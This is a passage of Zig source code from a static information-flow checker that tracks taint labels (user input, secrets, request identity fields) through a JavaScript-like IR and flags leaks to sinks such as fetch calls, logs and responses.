            found = property.value;
        }
        return found;
    }

    fn catalogEntry(self: *const FlowChecker, catalog_node: NodeIndex, wanted: []const u8) ?NodeIndex {
        const catalog = self.ir_view.getObject(catalog_node) orelse return null;
        var found: ?NodeIndex = null;
        for (0..catalog.properties_count) |index| {
            const property_node = self.ir_view.getListIndex(catalog.properties_start, @intCast(index));
            if (self.ir_view.getTag(property_node) != .object_property) return null;
            const property = self.ir_view.getProperty(property_node) orelse return null;
            const name = self.getPropertyKeyName(property.key) orelse return null;
            if (!std.mem.eql(u8, name, wanted)) continue;
            if (found != null) return null;
            found = self.resolveCatalogObject(property.value);
        }
        return found;
    }

    fn catalogString(self: *const FlowChecker, node: NodeIndex) ?[]const u8 {
        if (self.ir_view.getTag(node) != .lit_string) return null;
        const string_idx = self.ir_view.getStringIdx(node) orelse return null;
        return self.ir_view.getString(string_idx);
    }

    fn appendRouteFunctionRoot(self: *FlowChecker, fn_node: NodeIndex) void {
        if (std.mem.indexOfScalar(NodeIndex, self.route_function_roots.items, fn_node) != null) return;
        self.route_function_roots.append(self.allocator, fn_node) catch self.markAllocationFailure();
    }

    fn resolveLiteralObjectMethod(self: *const FlowChecker, node: NodeIndex) ?NodeIndex {
        const tag = self.ir_view.getTag(node) orelse return null;
        if (tag == .object_literal) return node;
        if (tag != .identifier) return null;
        const binding = self.bindingAt(node) orelse return null;
        // A parameter of the callee now being summarized: the call site passed
        // an object literal for it, or nothing resolvable. A reassigned
        // parameter is not the value the call site passed.
        if (self.param_values.get(packBindingKey(binding.scope_id, binding.slot))) |passed| {
            if (self.bindingIsMutated(binding)) return null;
            return if (self.ir_view.getTag(passed) == .object_literal) passed else null;
        }
        const decl = self.findBindingDecl(binding) orelse return null;
        if (self.bindingIsMutated(binding) or
            self.bindingHasAlias(binding) or
            self.bindingEscapesStableResolution(binding)) return null;
        return if (self.ir_view.getTag(decl.init) == .object_literal) decl.init else null;
    }

    fn findBindingDecl(self: *const FlowChecker, binding: ir.BindingRef) ?Node.VarDecl {
        const key = packBindingKey(binding.scope_id, binding.slot);
        const node_count = self.ir_view.nodeCount();
        for (0..node_count) |idx_usize| {
            const idx: NodeIndex = @intCast(idx_usize);
            const tag = self.ir_view.getTag(idx) orelse continue;
            if (tag != .var_decl and tag != .function_decl) continue;
            const decl = self.ir_view.getVarDecl(idx) orelse continue;
            if (packBindingKey(decl.binding.scope_id, decl.binding.slot) != key) continue;
            return decl;
        }
        return null;
    }

    fn bindingIsMutated(self: *const FlowChecker, binding: ir.BindingRef) bool {
        const key = packBindingKey(binding.scope_id, binding.slot);
        const node_count = self.ir_view.nodeCount();
        for (0..node_count) |idx_usize| {
            const idx: NodeIndex = @intCast(idx_usize);
            if (self.ir_view.getTag(idx) != .assignment) continue;
            const asgn = self.ir_view.getAssignment(idx) orelse return true;
            const root = self.assignmentRootBinding(asgn.target) orelse continue;
            if (packBindingKey(root.scope_id, root.slot) == key) return true;
        }
        return false;
    }

    fn bindingHasAlias(self: *const FlowChecker, binding: ir.BindingRef) bool {
        const key = packBindingKey(binding.scope_id, binding.slot);
        const node_count = self.ir_view.nodeCount();
        for (0..node_count) |idx_usize| {
            const idx: NodeIndex = @intCast(idx_usize);
            const tag = self.ir_view.getTag(idx) orelse continue;
            if (tag == .var_decl) {
                const decl = self.ir_view.getVarDecl(idx) orelse continue;
                if (self.ir_view.getTag(decl.init) != .identifier) continue;
                const source = self.bindingAt(decl.init) orelse continue;
                if (packBindingKey(source.scope_id, source.slot) == key) return true;
            } else if (tag == .assignment) {
                const asgn = self.ir_view.getAssignment(idx) orelse continue;
                if (self.ir_view.getTag(asgn.value) != .identifier) continue;
                const source = self.bindingAt(asgn.value) orelse continue;
                if (packBindingKey(source.scope_id, source.slot) == key) return true;
            }
        }
        return false;
    }

    /// Stable object resolution is valid only while no other value can mutate
    /// the object. Reject bindings stored in aggregates, passed to unknown
    /// calls, assigned elsewhere, or returned.
    fn bindingEscapesStableResolution(self: *const FlowChecker, binding: ir.BindingRef) bool {
        return self.bindingEscapesStableResolutionDepth(binding, 0);
    }

    fn bindingEscapesStableResolutionDepth(
        self: *const FlowChecker,
        binding: ir.BindingRef,
        depth: u8,
    ) bool {
        if (depth >= max_summary_depth) return true;
        const key = packBindingKey(binding.scope_id, binding.slot);
        const node_count = self.ir_view.nodeCount();
        for (0..node_count) |idx_usize| {
            const idx: NodeIndex = @intCast(idx_usize);
            const tag = self.ir_view.getTag(idx) orelse continue;
            switch (tag) {
                .var_decl => {
                    const decl = self.ir_view.getVarDecl(idx) orelse return true;
                    if (decl.init == null_node) continue;
                    if (packBindingKey(decl.binding.scope_id, decl.binding.slot) == key) continue;
                    if (self.nodeContainsBinding(decl.init, key, 0)) {
                        return true;
                    }
                },
                .assignment => {
                    const assignment = self.ir_view.getAssignment(idx) orelse return true;
                    if (self.nodeContainsBinding(assignment.value, key, 0)) return true;
                },
                .call, .method_call => {
                    const call = self.ir_view.getCall(idx) orelse return true;
                    for (0..call.args_count) |arg_index| {
                        const arg = self.ir_view.getListIndex(call.args_start, @intCast(arg_index));
                        if (!self.nodeContainsBinding(arg, key, 0)) continue;
                        if (self.nodeIsBinding(arg, key) and
                            self.callKeepsArgumentLocal(call, arg_index, depth + 1)) continue;
                        return true;
                    }
                },
                .return_stmt => {
                    const value = self.ir_view.getOptValue(idx) orelse continue;
                    if (self.nodeContainsBinding(value, key, 0)) {
                        return true;
                    }
                },
                // exhaustive: the remaining nodes do not themselves store,
                // return, or pass a value. Their enclosing expression is checked.
                else => {},
            }
        }
        return false;
    }

    fn callKeepsArgumentLocal(self: *const FlowChecker, call: Node.CallExpr, arg_index: usize, depth: u8) bool {
        // Type-test patterns lower to this predicate. It reads the value kind
        // without retaining or changing the argument.
        if (arg_index == 0 and self.isGlobalMethodCall(call.callee, "Array", &.{"isArray"})) {
            const member = self.ir_view.getMember(call.callee) orelse return false;
            const array_binding = self.bindingAt(member.object) orelse return false;
            return !self.bindingIsMutated(array_binding) and
                !self.bindingHasAlias(array_binding) and
                !self.bindingEscapesStableResolutionDepth(array_binding, depth);
        }
        const fn_node = self.resolveFunctionNode(call.callee) orelse return false;
        const func = self.ir_view.getFunction(fn_node) orelse return false;
        if (arg_index >= func.params_count) return false;
        const param = self.ir_view.getListIndex(func.params_start, @intCast(arg_index));
        const binding = self.paramBinding(param) orelse return false;
        const key = packBindingKey(binding.scope_id, binding.slot);
        for (0..self.ir_view.nodeCount()) |idx_usize| {
            const idx: NodeIndex = @intCast(idx_usize);
            const tag = self.ir_view.getTag(idx) orelse continue;
            if (tag != .call and tag != .method_call) continue;
            const nested_call = self.ir_view.getCall(idx) orelse return false;
            const receiver = self.assignmentRootBinding(nested_call.callee) orelse continue;
            if (packBindingKey(receiver.scope_id, receiver.slot) == key) return false;
        }
        return !self.bindingIsMutated(binding) and
            !self.bindingHasAlias(binding) and
            !self.bindingEscapesStableResolutionDepth(binding, depth);
    }

    fn nodeIsBinding(self: *const FlowChecker, node: NodeIndex, key: u64) bool {
        if (self.ir_view.getTag(node) != .identifier) return false;
        const found = self.bindingAt(node) orelse return false;
        return packBindingKey(found.scope_id, found.slot) == key;
    }

    fn nodeContainsBinding(self: *const FlowChecker, node: NodeIndex, key: u64, depth: u8) bool {
        if (node == null_node) return false;
        if (depth >= max_summary_depth) return true;
        const tag = self.ir_view.getTag(node) orelse return true;
        if (tag == .identifier) return self.nodeIsBinding(node, key);
        return switch (tag) {
            // Reading a field does not pass the containing object. In
            // particular, assigning found.params cannot replace found.handler.
            // A stored self-reference already fails the mutation/escape scan.
            .member_access, .optional_chain => blk: {
                const member = self.ir_view.getMember(node) orelse break :blk true;
                if (self.nodeIsBinding(member.object, key)) break :blk false;
                break :blk self.nodeContainsBinding(member.object, key, depth + 1);
            },
            .computed_access => blk: {
                const computed = self.ir_view.getMember(node) orelse break :blk true;
                if (self.nodeIsBinding(computed.object, key)) break :blk false;
                break :blk self.nodeContainsBinding(computed.object, key, depth + 1);
            },
            .array_literal => blk: {
                const array = self.ir_view.getArray(node) orelse break :blk true;
                for (0..array.elements_count) |i| {
                    const element = self.ir_view.getListIndex(array.elements_start, @intCast(i));
                    if (self.nodeContainsBinding(element, key, depth + 1)) break :blk true;
                }
                break :blk false;
            },
            .object_literal => blk: {
                const object_expr = self.ir_view.getObject(node) orelse break :blk true;
                for (0..object_expr.properties_count) |i| {
                    const property = self.ir_view.getListIndex(object_expr.properties_start, @intCast(i));
                    if (self.nodeContainsBinding(property, key, depth + 1)) break :blk true;
                }
                break :blk false;
            },
            .object_property => blk: {
                const property = self.ir_view.getProperty(node) orelse break :blk true;
                break :blk self.nodeContainsBinding(property.value, key, depth + 1);
            },
            .spread, .object_spread => blk: {
                const value = self.ir_view.getOptValue(node) orelse break :blk true;
                break :blk self.nodeContainsBinding(value, key, depth + 1);
            },
            .ternary => blk: {
                const ternary = self.ir_view.getTernary(node) orelse break :blk true;
                break :blk self.nodeContainsBinding(ternary.condition, key, depth + 1) or
                    self.nodeContainsBinding(ternary.then_branch, key, depth + 1) or
                    self.nodeContainsBinding(ternary.else_branch, key, depth + 1);
            },
            .binary_op => blk: {
                const binary = self.ir_view.getBinary(node) orelse break :blk true;
                break :blk self.nodeContainsBinding(binary.left, key, depth + 1) or
                    self.nodeContainsBinding(binary.right, key, depth + 1);
            },
            .unary_op => blk: {
                const unary = self.ir_view.getUnary(node) orelse break :blk true;
                break :blk self.nodeContainsBinding(unary.operand, key, depth + 1);
            },
            .match_expr => blk: {
                const match_expr = self.ir_view.getMatchExpr(node) orelse break :blk true;
                for (0..match_expr.arms_count) |i| {
                    const arm_idx = self.ir_view.getListIndex(match_expr.arms_start, @intCast(i));
                    const arm = self.ir_view.getMatchArm(arm_idx) orelse break :blk true;
                    if (self.nodeContainsBinding(arm.body, key, depth + 1)) break :blk true;
                }
                break :blk false;
            },
            // These nodes either have no value child, or their relevant edges
            // are scanned directly by bindingEscapesStableResolutionDepth.
            // Keep this list exhaustive so a new child-bearing tag cannot
            // silently make an escaping binding look stable.
            .lit_int,
            .lit_float,
            .lit_string,
            .lit_bool,
            .lit_null,
            .lit_undefined,
            .identifier,
            .call,
            .method_call,
            .assignment,
            .object_method,
            .object_getter,
            .object_setter,
            .function_expr,
            .arrow_function,
            .await_expr,
            .yield_expr,
            .sequence_expr,
            .comma_expr,
            .match_arm,
            .match_pattern,
            .match_type_test,
            .expr_stmt,
            .var_decl,
            .if_stmt,
            .for_stmt,
            .for_of_stmt,
            .for_in_stmt,
            .while_stmt,
            .do_while_stmt,
            .switch_stmt,
            .case_clause,
            .return_stmt,
            .assert_stmt,
            .throw_stmt,
            .break_stmt,
            .continue_stmt,
            .try_stmt,
            .block,
            .labeled_stmt,
            .function_decl,
            .array_pattern,
            .pattern_element,
            .pattern_rest,
            .pattern_default,
            .import_decl,
            .import_specifier,
            .import_default,
            .import_namespace,
            .export_decl,
            .export_specifier,
            .export_default,
            .export_all,
            .program,
            .param_list,
            .arg_list,
            .stmt_list,
            => false,
        };
    }

    fn resolveFunctionNode(self: *const FlowChecker, node: NodeIndex) ?NodeIndex {
        const tag = self.ir_view.getTag(node) orelse return null;
        return switch (tag) {
            .function_expr, .arrow_function => node,
            .function_decl => blk: {
                const decl = self.ir_view.getVarDecl(node) orelse break :blk null;
                break :blk if (decl.init != null_node) decl.init else null;
            },
            .identifier => blk: {
                const binding = self.bindingAt(node) orelse break :blk null;
                const decl = self.findBindingDecl(binding) orelse break :blk null;
                if (self.bindingIsMutated(binding)) break :blk null;
                const init_tag = self.ir_view.getTag(decl.init) orelse break :blk null;
                if (init_tag != .function_expr and init_tag != .arrow_function) break :blk null;
                break :blk decl.init;
            },
            // exhaustive: every other expression is not a statically resolved
            // function value, so dispatch adds `.unknown` instead of proving it.
            else => null,
        };
    }

    fn findHandlerParam(self: *FlowChecker, handler_func: NodeIndex) void {
        const func = self.ir_view.getFunction(handler_func) orelse return;
        if (func.params_count == 0) return;

        // First parameter is the request object. The parser wraps every
        // function parameter in a `.pattern_element`, even for the simple
        // `function handler(req)` case; drill through to the binding.
        const param_idx = self.ir_view.getListIndex(func.params_start, 0);
        const binding = self.paramBinding(param_idx) orelse return;
        const key = packBindingKey(binding.scope_id, binding.slot);
        self.req_binding_key = key;
        // Request parameter carries user_input label
        self.binding_labels.put(self.allocator, key, .{ .user_input = true }) catch self.markAllocationFailure();
        self.req_identity_trusted = !self.programMayWriteReqIdentity(key);
    }

    /// Identity fields a tool request carries from the verifier (M4 T5).
    fn isReqIdentityField(name: []const u8) bool {
        return std.mem.eql(u8, name, "subject") or std.mem.eql(u8, name, "tenant");
    }

    /// True when any assignment anywhere in the program could write
    /// `subject` or `tenant` on the request, or rebind the request parameter.
    /// The scan is by property name over every assignment, not only those
    /// rooted at `req`, so an alias (`const r = req; r.subject = x`) or a
    /// helper that writes its parameter is caught too; a computed write whose
    /// key is not a literal could name either field and counts as well. Over
    /// counting only keeps a label, so the direction is safe.
    fn programMayWriteReqIdentity(self: *const FlowChecker, req_key: u32) bool {
        const node_count = self.ir_view.nodeCount();
        for (0..node_count) |idx_usize| {
            const idx: NodeIndex = @intCast(idx_usize);
            const tag = self.ir_view.getTag(idx) orelse continue;
            if (tag != .assignment) continue;
            const asgn = self.ir_view.getAssignment(idx) orelse return true;
            const target_tag = self.ir_view.getTag(asgn.target) orelse return true;
            switch (target_tag) {
                .identifier => {
                    const binding = self.bindingAt(asgn.target) orelse return true;
                    if (packBindingKey(binding.scope_id, binding.slot) == req_key) return true;
                },
                .member_access, .optional_chain => {
                    const member = self.ir_view.getMember(asgn.target) orelse return true;
                    const name = self.resolveAtomName(member.property) orelse return true;
                    if (isReqIdentityField(name)) return true;
                },
                .computed_access => {
                    const member = self.ir_view.getMember(asgn.target) orelse return true;
                    if (self.ir_view.getTag(member.computed) != .lit_string) return true;
                    const str_idx = self.ir_view.getStringIdx(member.computed) orelse return true;
                    const key = self.ir_view.getString(str_idx) orelse return true;
                    if (isReqIdentityField(key)) return true;
                },
                // exhaustive: any other target shape binds nothing a read of
                // `req.subject` could observe - a call result or a literal.
                else => {},
            }
        }
        return self.requestEscapesScan(req_key);
    }

    /// True when the request object can reach code the assignment scan above
    /// cannot read: passed to a function from another file, a global such as
    /// `Object.assign`, or a method, or copied into another binding. Only a
    /// built-in module export (native, which writes no JS field) and a
    /// function declared in this file (whose assignments the scan already
    /// read) may receive it. Over counting only keeps a label.
    fn requestEscapesScan(self: *const FlowChecker, req_key: u32) bool {
        const node_count = self.ir_view.nodeCount();
        for (0..node_count) |idx_usize| {
            const idx: NodeIndex = @intCast(idx_usize);
            const tag = self.ir_view.getTag(idx) orelse continue;
            switch (tag) {
                .var_decl => {
                    const decl = self.ir_view.getVarDecl(idx) orelse return true;
                    if (self.isBindingKey(decl.init, req_key)) return true;
                },
                .call, .method_call => {
                    const call_data = self.ir_view.getCall(idx) orelse return true;
                    var passes_req = false;
                    for (0..call_data.args_count) |k| {
                        if (self.isBindingKey(self.ir_view.getListIndex(call_data.args_start, @intCast(k)), req_key)) passes_req = true;
                    }
                    if (passes_req and !self.calleeCannotWriteRequest(call_data.callee)) return true;
                },
                // exhaustive: only a declaration or a call can hand the
                // request object to code this scan does not read.
                else => {},
            }
        }
        return false;
    }

    fn isBindingKey(self: *const FlowChecker, node: NodeIndex, key: u32) bool {
        if (node == null_node or self.ir_view.getTag(node) != .identifier) return false;
        const binding = self.bindingAt(node) orelse return false;
        return packBindingKey(binding.scope_id, binding.slot) == key;
    }

    /// A built-in module export or a function declared in this file.
    fn calleeCannotWriteRequest(self: *const FlowChecker, callee: NodeIndex) bool {
        if (self.ir_view.getTag(callee) != .identifier) return false;
        const binding = self.bindingAt(callee) orelse return false;
        if (self.module_fn_meta.contains(binding.slot)) return true;
        return self.user_fn_decls.contains(packBindingKey(binding.scope_id, binding.slot));
    }

    /// The labels of a `req.subject` / `req.tenant` read. They come from the
    /// runtime's verifier, not the caller, so the request's `user_input` label
    /// does not reach them - unless the program could have written them, in
    /// which case the read keeps every label the request carries. Any other
    /// label the request picked up (a secret assigned onto it) is kept either
    /// way.
    fn reqIdentityLabels(self: *const FlowChecker, req_labels: LabelSet) LabelSet {
        var labels = req_labels;
        if (self.req_identity_trusted) labels.user_input = false;
        return labels;
    }

    /// True for `req.subject` / `req.tenant` (dot or optional-chain form) on
    /// the handler's request parameter.
    fn isReqIdentityMember(self: *const FlowChecker, member_object: NodeIndex, property: u16) bool {
        if (!self.isReqBinding(member_object)) return false;
        const name = self.resolveAtomName(property) orelse return false;
        return isReqIdentityField(name);
    }

    /// What a value is when it is the request or the request's headers (plan
    /// unit F6). Only these give a `headers.authorization` read its credential
    /// label; an object that happens to have a `headers` field is neither.
    const CarrierKind = enum { request, headers };

    /// The request or headers a node stands for, or null. The handler's own
    /// parameter is the request. So is a binding that `request_carriers`
    /// records: a parameter that a call site bound to the request, or a name
    /// initialised from it. `<request>.headers` is the headers.
    fn carrierKind(self: *const FlowChecker, node: NodeIndex) ?CarrierKind {
        const tag = self.ir_view.getTag(node) orelse return null;
        switch (tag) {
            .identifier => {
                const binding = self.bindingAt(node) orelse return null;
                const key = packBindingKey(binding.scope_id, binding.slot);
                if (self.req_binding_key) |req_key| {
                    if (key == req_key) return .request;
                }
                return self.request_carriers.get(key);
            },
            .member_access, .optional_chain => {
                const member = self.ir_view.getMember(node) orelse return null;
                if (self.carrierKind(member.object) != .request) return null;
                const name = self.resolveAtomName(member.property) orelse return null;
                return if (std.mem.eql(u8, name, "headers")) .headers else null;
            },
            // exhaustive: any other expression is not known to be the request,
            // so a header read on it earns no credential label.
            else => return null,
        }
    }

    /// Record, or forget, that `key` names the request or its headers. A
    /// declaration is a fresh binding, so it forgets whatever an earlier walk
    /// of the same function recorded (the F3 rule for labels).
    fn setCarrier(self: *FlowChecker, key: u32, kind: ?CarrierKind) void {
        if (kind) |k| {
            self.request_carriers.put(self.allocator, key, k) catch self.markAllocationFailure();
        } else {
            _ = self.request_carriers.remove(key);
        }
    }

    fn isReqBinding(self: *const FlowChecker, node: NodeIndex) bool {
        if (self.ir_view.getTag(node) != .identifier) return false;
        const binding = self.bindingAt(node) orelse return false;
        const req_key = self.req_binding_key orelse return false;
        return packBindingKey(binding.scope_id, binding.slot) == req_key;
    }

    /// Unwrap a function parameter node to its binding slot. Handles both
    /// the bare `.identifier` shape and the `.pattern_element` wrapper the
    /// parser emits for every parameter.
    fn paramBinding(self: *const FlowChecker, param_idx: NodeIndex) ?ir.BindingRef {
        return self.ir_view.paramBinding(param_idx);
    }

    /// Walk a (possibly nested) member-access assignment target down to its root
    /// identifier binding, so `obj.field = secret` / `obj.a.b = secret` taints
    /// the base object rather than dropping the label entirely.
    /// Propagate the labels of an assignment's value onto the binding it
    /// writes. Reached both from a statement-position assignment (via
    /// `expr_stmt`) and from a bare `.assignment` statement node.
    fn applyAssignmentLabels(self: *FlowChecker, node: NodeIndex) void {
        const asgn = self.ir_view.getAssignment(node) orelse return;
        const labels = self.inferLabels(asgn.value);
        const target_tag = self.ir_view.getTag(asgn.target) orelse return;
        if (target_tag == .identifier) {
            const binding = self.bindingAt(asgn.target) orelse return;
            const key = packBindingKey(binding.scope_id, binding.slot);
            // Only a const holds an origin, but a written name never keeps one.
            _ = self.binding_origins.remove(key);
            if (asgn.op) |_| {
                // Compound assignment (+=, etc): merge with existing
                const existing = self.binding_labels.get(key) orelse LabelSet.empty;
                self.binding_labels.put(self.allocator, key, LabelSet.merge(existing, labels)) catch self.markAllocationFailure();
            } else {
                // Simple assignment: replace
                self.binding_labels.put(self.allocator, key, labels) catch self.markAllocationFailure();
                // The name may now hold the request. It keeps an earlier
                // record when this branch assigns something else, because
                // another branch may have assigned the request.
                if (self.carrierKind(asgn.value)) |kind| self.setCarrier(key, kind);
            }
            self.recordBindingValue(binding, asgn.value);
        } else if (target_tag == .member_access or target_tag == .optional_chain or target_tag == .computed_access) {
            // `obj.field = secret` / `obj[k] = secret`: taint the base object so
            // a later read of `obj` keeps the label. Merge rather than replace,
            // since other fields may already taint it.
            if (labels.isEmpty()) return;
            const binding = self.assignmentRootBinding(asgn.target) orelse return;
            const key = packBindingKey(binding.scope_id, binding.slot);
            const existing = self.binding_labels.get(key) orelse LabelSet.empty;
            self.binding_labels.put(self.allocator, key, LabelSet.merge(existing, labels)) catch self.markAllocationFailure();
            // The object now holds labels its origin does not explain, and a
            // precise member read would subtract them with the declared ones.
            _ = self.binding_origins.remove(key);
        }
    }

    fn assignmentRootBinding(self: *const FlowChecker, target: NodeIndex) ?ir.BindingRef {
        var node = target;
        while (true) {
            const tag = self.ir_view.getTag(node) orelse return null;
            switch (tag) {
                .identifier => return self.bindingAt(node),
                .member_access, .optional_chain, .computed_access => {
                    const member = self.ir_view.getMember(node) orelse return null;
                    node = member.object;
                },
                // exhaustive: null means the target has no root identifier to
                // taint - an assignment to a call result or a literal, which
                // binds nothing the checker tracks. Every target shape that
                // does reach a binding is walked above.
                else => return null,
            }
        }
    }

    /// Propagate argument taint of a mutating array method back onto the
    /// receiver binding: `arr.push(secret)` taints `arr`, so a later
    /// `return { arr }` is caught. Mirrors the member-assignment taint
    /// propagation for `obj.field = secret`.
    fn propagateMutatingMethodTaint(self: *FlowChecker, expr: NodeIndex) void {
        const tag = self.ir_view.getTag(expr) orelse return;
        if (tag != .call and tag != .method_call) return;
        const call_data = self.ir_view.getCall(expr) orelse return;
        const callee_tag = self.ir_view.getTag(call_data.callee) orelse return;
        if (callee_tag != .member_access and callee_tag != .optional_chain) return;
        const member = self.ir_view.getMember(call_data.callee) orelse return;
        const method = self.resolveAtomName(member.property) orelse return;
        const mutating = std.mem.eql(u8, method, "push") or
            std.mem.eql(u8, method, "unshift") or
            std.mem.eql(u8, method, "splice");
        if (!mutating) return;
        // Receiver must be a plain identifier binding.
        if (self.ir_view.getTag(member.object) != .identifier) return;
        const binding = self.bindingAt(member.object) orelse return;
        var arg_labels = LabelSet.empty;
        for (0..call_data.args_count) |i| {
            const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
            arg_labels = LabelSet.merge(arg_labels, self.inferLabels(arg));
        }
        if (arg_labels.isEmpty()) return;
        const key = packBindingKey(binding.scope_id, binding.slot);
        const existing = self.binding_labels.get(key) orelse LabelSet.empty;
        self.binding_labels.put(self.allocator, key, LabelSet.merge(existing, arg_labels)) catch self.markAllocationFailure();
        // As for a member assignment: labels the origin does not explain.
        _ = self.binding_origins.remove(key);
    }

    /// Record a defining value node for a binding so the response-sink check
    /// can resolve returned identifiers. Every value is kept (not just the
    /// last) so a tainted branch assignment is still found when a later
    /// branch overwrites the labels.
    fn recordBindingValue(self: *FlowChecker, binding: ir.BindingRef, value: NodeIndex) void {
        if (value == null_node) return;
        const key = packBindingKey(binding.scope_id, binding.slot);
        const gop = self.binding_value_nodes.getOrPut(self.allocator, key) catch {
            self.markAllocationFailure();
            return;
        };
        if (!gop.found_existing) gop.value_ptr.* = .empty;
        gop.value_ptr.append(self.allocator, value) catch self.markAllocationFailure();
    }

    fn walkStmt(self: *FlowChecker, node: NodeIndex) void {
        if (node == null_node) return;
        const tag = self.ir_view.getTag(node) orelse return;

        switch (tag) {
            .program, .block => {
                const block = self.ir_view.getBlock(node) orelse return;
                for (0..block.stmts_count) |i| {
                    const stmt_idx = self.ir_view.getListIndex(block.stmts_start, @intCast(i));
                    self.walkStmt(stmt_idx);
                }
            },

            .if_stmt => {
                const if_s = self.ir_view.getIfStmt(node) orelse return;
                self.scanExprSinks(if_s.condition);

                // Both `working_constraints` and `working_io_calls` are
                // path-scoped: entering a branch extends them, leaving
                // restores them. Without the io_calls restore, calls made
                // in a sibling branch would appear in the witness for this
                // one, so the synthesised stub sequence would no longer
                // drive the handler down the path that actually witnesses
                // the sink.
                const saved_io = self.working_io_calls.items.len;
                const then_pushed = self.pushConditionConstraints(if_s.condition, false);
                self.walkStmt(if_s.then_branch);
                self.popConstraints(then_pushed);
                self.working_io_calls.shrinkRetainingCapacity(saved_io);

                if (if_s.else_branch != null_node) {
                    const else_pushed = self.pushConditionConstraints(if_s.condition, true);
                    self.walkStmt(if_s.else_branch);
                    self.popConstraints(else_pushed);
                    self.working_io_calls.shrinkRetainingCapacity(saved_io);
                }
            },

            .var_decl => {
                const vd = self.ir_view.getVarDecl(node) orelse return;
                if (vd.init != null_node) {
                    // A const keeps its initializer's origin, so an alias of a
                    // body or a field is read precisely (M4 T4). A let or var
                    // can be reassigned, so it keeps only the labels. Binding
                    // an aggregate is not forwarding it: its later uses decide
                    // the P8 status, so the initializer is read as a member
                    // object would be.
                    const init_origin: ?Origin = if (vd.kind == .@"const") self.originOf(vd.init) else null;
                    if (init_origin != null) self.member_object_depth += 1;
                    const labels = self.inferLabels(vd.init);
                    if (init_origin != null) self.member_object_depth -= 1;
                    // A declaration is a fresh binding, so it overwrites even with
                    // the empty set: a callee walked once per call site must not
                    // keep the labels an earlier call bound here (plan unit F3).
                    {
                        const key = packBindingKey(vd.binding.scope_id, vd.binding.slot);
                        self.binding_labels.put(self.allocator, key, labels) catch self.markAllocationFailure();
                        self.setCarrier(key, self.carrierKind(vd.init));
                    }
                    if (init_origin) |origin| {
                        const key = packBindingKey(vd.binding.scope_id, vd.binding.slot);
                        self.binding_origins.put(self.allocator, key, origin) catch self.markAllocationFailure();
                    }
                    self.recordBindingValue(vd.binding, vd.init);
                    self.trackModuleCallInit(vd);
                    // Track result bindings from validation calls for .value label narrowing
                    self.trackResultBinding(vd);
                    // Egress/console/log sink checks must also run when the call's
                    // result is bound (`const r = fetch(url, { body: secret })`),
                    // not only on bare-statement calls. checkExprSinks self-guards
                    // to a no-op for any initializer that is not such a call.
                    self.scanExprSinks(vd.init);
                } else {
                    // `let y;` starts empty on every walk for the same reason.
                    const key = packBindingKey(vd.binding.scope_id, vd.binding.slot);
                    self.binding_labels.put(self.allocator, key, LabelSet.empty) catch self.markAllocationFailure();
                    self.setCarrier(key, null);
                }
            },

            .assignment => self.applyAssignmentLabels(node),

            .return_stmt => {
                if (self.ir_view.getOptValue(node)) |ret_val| {
                    // A sink inside the returned expression runs on this path
                    // too: `return fetch(url, { body: secret })`, a field of
                    // the response, a concise arrow body (which is a return).
                    if (self.summary_returns) |acc| {
                        acc.* = LabelSet.merge(acc.*, self.inferLabels(ret_val));
                        self.scanExprSinks(ret_val);
                    } else {
                        self.scanExprSinks(ret_val);
                        // Check if returning data via Response helpers
                        self.checkResponseSink(ret_val);
                    }
                }
            },

            .expr_stmt => {
                if (self.ir_view.getOptValue(node)) |expr| {
                    self.scanExprSinks(expr);
                    // A call written as a statement discards its value, and
                    // only the label inference enters a called body. Without
                    // this a helper that logs its secret argument is silent
                    // when it is called as `audit(secret);` and checked when
                    // it is called as `const n = audit(secret);`. Any other
                    // expression statement that is not an assignment (`ok &&
                    // audit(secret);`, a ternary of calls) discards its value
                    // the same way, and its calls enter their callee bodies
                    // only through the label inference.
                    const expr_tag = self.ir_view.getTag(expr) orelse .lit_undefined;
                    if (expr_tag != .assignment) _ = self.inferLabels(expr);
                    self.propagateMutatingMethodTaint(expr);
                    // An assignment written as a statement (`obj.field = secret;`)
                    // parses as an expr_stmt wrapping the assignment, so the
                    // `.assignment` arm below never sees it. Without this the
                    // label update never ran for the ordinary form.
                    if (self.ir_view.getTag(expr) == .assignment) self.applyAssignmentLabels(expr);
                }
            },

            .for_of_stmt, .for_in_stmt => {
                const fi = self.ir_view.getForIter(node) orelse return;
                // Iteration variable inherits labels from iterable
                const iterable_labels = self.inferLabels(fi.iterable);
                self.scanExprSinks(fi.iterable);
                if (!iterable_labels.isEmpty()) {
                    const key = packBindingKey(fi.binding.scope_id, fi.binding.slot);
                    self.binding_labels.put(self.allocator, key, iterable_labels) catch self.markAllocationFailure();
                }
                self.walkStmt(fi.body);
            },

            .switch_stmt => {
                const sw = self.ir_view.getSwitchStmt(node) orelse return;
                self.scanExprSinks(sw.discriminant);
                for (0..sw.cases_count) |i| {
                    const case_idx = self.ir_view.getListIndex(sw.cases_start, @intCast(i));
                    const cc = self.ir_view.getCaseClause(case_idx) orelse continue;
                    for (0..cc.body_count) |j| {
                        const body_stmt = self.ir_view.getListIndex(cc.body_start, @intCast(j));
                        self.walkStmt(body_stmt);
                    }
                }
            },

            .function_decl, .function_expr, .arrow_function => {
                // While summarizing a callee, a nested function's returns are
                // not the callee's returns; skip its body.
                if (self.summary_returns != null) return;
                const func = self.ir_view.getFunction(node) orelse return;
                self.walkStmt(func.body);
            },

            .export_default => {
                if (self.ir_view.getOptValue(node)) |val| {
                    self.walkStmt(val);
                }
            },

            .call, .method_call => {
                self.scanExprSinks(node);
            },

            .assert_stmt => {
                const assert = self.ir_view.getAssertStmt(node) orelse return;
                self.scanExprSinks(assert.condition);
                if (assert.error_expr != null_node) {
                    self.scanExprSinks(assert.error_expr);
                }
            },

            // exhaustive: every statement kind that holds an expression which
            // can reach a sink, bind a label, or contain further statements is
            // handled above, including program/block and if_stmt at the top of
            // this switch. The rest carry no expression to check.
            else => {},
        }
    }

    /// The labels of a read whose binding has none recorded. A local or an
    /// argument that no walk bound yet is empty, as it always was. A
    /// module-level binding is different: `walkModuleDeclarations` records
    /// every data declaration before any function runs, so a `.global` with no
    /// record is one the walk did not reach, and the empty set would claim it
    /// clean. It carries `.unknown`, which clears what a sink decides. A
    /// function or an import holds no datum, so it stays empty.
    fn unrecordedBindingLabels(self: *const FlowChecker, binding: ir.BindingRef, key: u32) LabelSet {
        // A capture that no declaration in scope matched: the empty set would
        // claim a value clean that the walk could not trace.
        if (binding.kind == .upvalue) return .{ .unknown = true };
        if (binding.kind != .global) return LabelSet.empty;
